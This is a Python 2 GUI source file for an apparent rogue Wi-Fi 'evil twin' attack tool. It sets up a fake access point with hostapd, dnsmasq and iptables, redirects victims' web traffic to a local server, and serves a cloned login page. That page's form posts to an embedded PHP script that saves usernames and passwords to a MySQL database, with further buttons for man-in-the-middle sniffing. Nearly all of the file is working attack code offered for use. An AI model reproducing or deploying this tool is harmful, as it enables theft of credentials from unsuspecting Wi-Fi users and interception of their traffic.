import httplib
import os
import os.path
import re
import time
import urllib2
import wx
from bs4 import BeautifulSoup

import redirecthandle
import wless_commands

read_html2 = ''


class SnifferGUI(wx.Frame):
    def __init__(self, parent, title):
        super(SnifferGUI, self).__init__(parent, title=title, size=(750, 550))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):

        panel = wx.Panel(self)
        # ~ panel.SetBackgroundColour('#4f5049')


        # ~ wless_commands.get_monitoring_interfaces()

        self.myLabel = wx.StaticText(panel, -1,
                                     label='Currently, fully page download automation is not fully implemented.\nPlease save the login page as /var/www/login.html or /var/www/html/login.html \nChange permission to 755 for all web contents you downloaded\nAnd press the Modify button. \nAfter modifying the fields to capture click on attack to proceed with the attack',
                                     pos=(10, 20))
        self.modifyButton = wx.Button(panel, -1, label='Modify the webpage', pos=(10, 135))
        self.username = wx.TextCtrl(panel, -1, "Username variable to capture", size=(200, 30), pos=(520, 135))
        self.password = wx.TextCtrl(panel, -1, "Password variable to capture", size=(200, 30), pos=(520, 200))

        self.mylistbox = wx.ListBox(panel, -1, pos=(160, 135), size=(350, 100), choices='')

        self.SSID = wx.TextCtrl(panel, -1, "SSID Name", size=(200, 30), pos=(10, 265))

        self.sniffButton = wx.Button(panel, -1, label='MiTM Attack', pos=(10, 350))
        self.victimIPButton = wx.Button(panel, -1, label='Get Victim IP', pos=(150, 350))

        self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(250, 265),
                                       choices=wless_commands.get_net_devices())

        self.nDeviceList2 = wx.ComboBox(panel, -1, value='Select Internet Interface', size=(200, 30), pos=(522, 265),
                                        choices=wless_commands.get_net_devices())

        self.startButton = wx.Button(panel, -1, label='Start Attack', pos=(10, 175))

        self.stopButton = wx.Button(panel, -1, label='Stop Attack', pos=(10, 220))
        self.closeButton = wx.Button(panel, -1, label='Quit', pos=(10, 470))

        # ~ self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 180))



        self.startButton.Bind(wx.EVT_BUTTON, self.executeCommand)
        self.stopButton.Bind(wx.EVT_BUTTON, self.stopfakeap)
        self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
        self.modifyButton.Bind(wx.EVT_BUTTON, self.modifyContent)
        self.sniffButton.Bind(wx.EVT_BUTTON, self.sniffdata)
        self.victimIPButton.Bind(wx.EVT_BUTTON, self.getVictimIPaddress)

    def sniffdata(self, e):
        import MiTM_sniffer
        MiTM_sniffer.startSniff()

    def getVictimIPaddress(self, e):
        import getVictimIP
        getVictimIP.startSniff()

    # ~ self.on_timer()
    def closeMe(self, e):
        self.Close()

    def stopfakeap(self, e):
        os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
        wx.MessageBox('Infernal Attack is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)

    def modifyContent(self, e):

        if not os.path.exists('/var/www/html/login.html') or not os.path.exists('/var/www/html/login.html'):
            wx.MessageBox('Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/',
                          'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)
            os.system('firefox &')

        else:




            def get_login_page():

                #
                import db_connect_creds

                username, password = db_connect_creds.read_creds()

                getcredsphp = '''

                <?php
$con=mysqli_connect("localhost","%s","%s","wpa_crack");
// Check connection
if (mysqli_connect_errno()) {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
// escape variables for security
$firstname = mysqli_real_escape_string($con, $_POST['username']);
$lastname = mysqli_real_escape_string($con, $_POST['password']);
$cDate= date("F j, Y, g:i a");
$hyphenput = "<->";
$sql="INSERT INTO content (key1, key2)
VALUES ('$cDate.$hyphenput.$firstname', '$lastname')";

if (!mysqli_query($con,$sql)) {
  die('Error: ' . mysqli_error($con));
}
echo "Now you may start browsing Internet";
//header('Location: http://google.com');

mysqli_close($con);
?> ''' %(username, password)
                tmpfile = open('/var/www/html/getcreds.php','w')
                tmpfile.write(getcredsphp)
                tmpfile.close()


                httplib.HTTPConnection.debuglevel = 1
                request = urllib2.Request('http://localhost/login.html')
                opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
                f = opener.open(request)
                ##article = re.sub(r'(?is)</html>.+', '</html>', article)
                redirect = f.url
                ##response = urllib2.urlopen('https://google.com')
                html = f.read()
                # print "Found the login page here: " + f.url
                ########## regex search and replace
                regex = re.search(r'action="([^"]*)".*?', html)
                post_action = str(regex.group(0))

                # ~ print "*" * 20
                # ~ print 'modifying the login page...'
                new_login = html.replace(post_action, 'action=getcreds.php')
                ##### create a login page
                index_page = open('/var/www/index2.html', 'wb')
                index_page.write(new_login)
                index_page.close()

                index_page2 = open('/var/www/html/index2.html', 'wb')
                index_page2.write(new_login)
                index_page2.close()

                ############# MOFIYING THE POST SCRIPT

                myhtml = open('/var/www/html/index2.html', 'r')

                read_html = myhtml.read()

                global read_html2
                read_html2 = read_html

                myhtml.close()

                number = 0

                html_proc = BeautifulSoup(read_html)

                inputs = html_proc.findAll('input')

                temparray = []

                for i in inputs:

                    try:

                        regexstring = str(i).replace('"', '\'')

                        regex_check = re.search(r'id=([^\s]+)', str(regexstring)).group(0).replace('id=', '')

                        # ~ print regex_check
                        # ~ print regex_check.group(0)


                        temparray.append(regex_check)

                    # ~ tmp = re.search(r'id=([^\s]+)', check).group(0).replace('id=','')
                    # ~
                    # ~ temparray.append(tmp.replace('"','\''))
                    except:
                        print ''

                self.mylistbox.Set(temparray)

            get_login_page()

    def executeCommand(self, e):

        user = self.username.GetValue()
        password = self.password.GetValue()
        SSID = self.SSID.GetValue()
        NetiFace = self.nDeviceList2.GetValue()
        AttackIface = self.nDeviceList.GetValue()

        # ~ fakeAPName = self.APname.GetValue()

        global read_html2
        # ~ print read_html2

        tmp = read_html2.replace('name="' + str(user) + '"', 'name="username"').replace('name="' + str(password) + '"',
                                                                                        'name="password"')

        if os.path.exists('/var/www/index.html'):
            os.system('mv /var/www/index.html /var/www/index_bkp.html')
            wx.MessageBox('Your current index.html is backed up as index_bkp.html', 'Info', wx.OK | wx.ICON_INFORMATION)

        if os.path.exists('/var/www/index.php'):
            os.system('mv /var/www/index.php /var/www/index_bkp.php')
            wx.MessageBox('Your current index.php is backed up as index_bkp.php', 'Info', wx.OK | wx.ICON_INFORMATION)

        if os.path.exists('/var/www/html/index.php'):
            os.system('mv /var/www/html/index.php /var/www/html/index_bkp.php')
            wx.MessageBox('Your current index.php is backed up as index_bkp.php', 'Info', wx.OK | wx.ICON_INFORMATION)

        if os.path.exists('/var/www/html/index.html'):
            os.system('mv /var/www/html/index.html /var/www/html/index_bkp.html')
            wx.MessageBox('Your current index.html is backed up as index_bkp.html', 'Info', wx.OK | wx.ICON_INFORMATION)

        new_page = open('/var/www/index.html', 'wb')
        new_page.write(tmp)
        new_page.close()

        new_page2 = open('/var/www/html/index.html', 'wb')
        new_page2.write(tmp)
        new_page2.close()

        os.system('firefox http://localhost/index.html &')
        time.sleep(3)

        hostapd = open('./Modules/infernal-hostapd.conf', 'wb')

        config_file = "interface=" + AttackIface + "\ndriver=nl80211\nssid=" + str(
            SSID) + "\nchannel=1\n#enable_karma=1\n"

        hostapd.write(config_file)
        hostapd.close()
        os.system("gnome-terminal -x hostapd ./Modules/infernal-hostapd.conf &")

        os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
		cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=%s
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""" % NetiFace)
        os.system("service dnsmasq start")

        # ~ iface = wless_commands.get_monitoring_interfaces()[0]

        os.system("""ifconfig """ + AttackIface + """ up
		ifconfig """ + AttackIface + """ 10.0.0.1/24
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
		echo 1 > /proc/sys/net/ipv4/ip_forward
		iptables --table nat --append POSTROUTING --out-interface """ + NetiFace + """ -j MASQUERADE
		iptables --append FORWARD --in-interface at0 -j ACCEPT
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
		iptables -t nat -A POSTROUTING -j MASQUERADE""")

    # ~ self.myLabel.SetLabel("Created Fake AP: "+str(fakeAPName))


# ~ if __name__ == '__main__':

def main():
    app = wx.App(False)
    frame = SnifferGUI(None, 'Create Infernal Wireless AP')
    app.MainLoop()

# ~ main()
